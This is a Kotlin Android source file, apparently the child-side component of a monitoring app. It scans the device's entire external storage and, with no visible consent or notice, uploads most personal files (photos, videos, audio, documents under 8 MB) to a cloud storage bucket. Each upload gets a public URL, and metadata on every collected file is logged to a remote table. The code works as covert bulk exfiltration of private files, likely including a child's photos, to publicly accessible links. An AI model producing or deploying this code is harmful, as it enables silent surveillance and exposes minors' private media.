package com.example.childapp.services

import android.content.Context
import android.os.Environment
import android.util.Log
import com.example.childapp.SupabaseManager
import com.example.childapp.models.FileData
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.storage.storage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

class FileScanner(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val BUCKET = "child-files"

    // Category definitions
    private val IMAGE_EXTS = setOf("jpg", "jpeg", "png", "gif", "bmp", "webp", "heic")
    private val VIDEO_EXTS = setOf("mp4", "mkv", "avi", "mov", "3gp", "webm")
    private val AUDIO_EXTS = setOf("mp3", "wav", "aac", "ogg", "flac", "m4a")
    private val DOC_EXTS   = setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv")

    // Max files per category
    private val CAT_LIMIT = 150
    // Max upload size per file = 8 MB
    private val MAX_UPLOAD_BYTES = 8 * 1024 * 1024L

    fun scanAndSync() {
        scope.launch {
            try {
                Log.d("FileScanner", "Starting scan...")
                val root = Environment.getExternalStorageDirectory()
                if (!root.exists() || !root.canRead()) {
                    Log.e("FileScanner", "Cannot read storage!")
                    return@launch
                }

                // Collect files per category separately
                val byCategory = mutableMapOf(
                    "Images"    to mutableListOf<File>(),
                    "Videos"    to mutableListOf<File>(),
                    "Audio"     to mutableListOf<File>(),
                    "Documents" to mutableListOf<File>(),
                    "Others"    to mutableListOf<File>()
                )

                scanDirectory(root, byCategory)

                val fileDataList = mutableListOf<FileData>()

                for ((category, files) in byCategory) {
                    Log.d("FileScanner", "Category $category: ${files.size} files")
                    for (file in files) {
                        val ext = file.extension.lowercase()
                        var storageUrl = ""

                        // Try uploading small files to Supabase Storage
                        if (file.length() <= MAX_UPLOAD_BYTES) {
                            try {
                                val storagePath = "$category/${file.name}"
                                val bytes = file.readBytes()
                                SupabaseManager.client.storage[BUCKET].upload(
                                    path = storagePath,
                                    data = bytes,
                                    upsert = true
                                )
                                storageUrl = SupabaseManager.client.storage[BUCKET].publicUrl(storagePath)
                                Log.d("FileScanner", "Uploaded: ${file.name}")
                            } catch (e: Exception) {
                                Log.w("FileScanner", "Upload failed for ${file.name}: ${e.message}")
                            }
                        }

                        fileDataList.add(FileData(
                            file_name     = file.name,
                            file_path     = file.absolutePath,
                            file_size_kb  = file.length() / 1024,
                            category      = category,
                            mime_type     = mimeTypeOf(ext),
                            last_modified = file.lastModified(),
                            storage_url   = storageUrl
                        ))
                    }
                }

                // Clear old data and insert fresh
                try {
                    SupabaseManager.client.from("files").delete { filter { neq("id", 0) } }
                } catch (_: Exception) {}

                // Insert in batches of 50
                fileDataList.chunked(50).forEach { batch ->
                    try {
                        SupabaseManager.client.from("files").insert(batch)
                        Log.d("FileScanner", "Inserted batch of ${batch.size}")
                    } catch (e: Exception) {
                        Log.e("FileScanner", "Insert error: ${e.message}")
                    }
                }

                Log.d("FileScanner", "Done! Total: ${fileDataList.size} files synced.")

            } catch (e: Exception) {
                Log.e("FileScanner", "Fatal: ${e.message}")
            }
        }
    }

    private fun scanDirectory(dir: File, byCategory: MutableMap<String, MutableList<File>>) {
        if (!dir.exists() || !dir.canRead()) return
        val allFull = byCategory.values.all { it.size >= CAT_LIMIT }
        if (allFull) return

        val files = dir.listFiles() ?: return
        for (file in files) {
            if (byCategory.values.all { it.size >= CAT_LIMIT }) return
            if (file.isDirectory) {
                if (!file.name.startsWith(".")) scanDirectory(file, byCategory)
            } else {
                val ext = file.extension.lowercase()
                val cat = categoryOf(ext)
                val list = byCategory[cat] ?: continue
                if (list.size < CAT_LIMIT && file.canRead() && file.length() > 0) {
                    list.add(file)
                }
            }
        }
    }

    private fun categoryOf(ext: String) = when {
        ext in IMAGE_EXTS -> "Images"
        ext in VIDEO_EXTS -> "Videos"
        ext in AUDIO_EXTS -> "Audio"
        ext in DOC_EXTS   -> "Documents"
        else              -> "Others"
    }

    private fun mimeTypeOf(ext: String) = when (ext) {
        "jpg", "jpeg" -> "image/jpeg"
        "png"         -> "image/png"
        "gif"         -> "image/gif"
        "webp"        -> "image/webp"
        "mp4"         -> "video/mp4"
        "mkv"         -> "video/x-matroska"
        "mp3"         -> "audio/mpeg"
        "wav"         -> "audio/wav"
        "pdf"         -> "application/pdf"
        "txt"         -> "text/plain"
        "doc", "docx" -> "application/msword"
        "xls", "xlsx" -> "application/vnd.ms-excel"
        else          -> "application/octet-stream"
    }
}
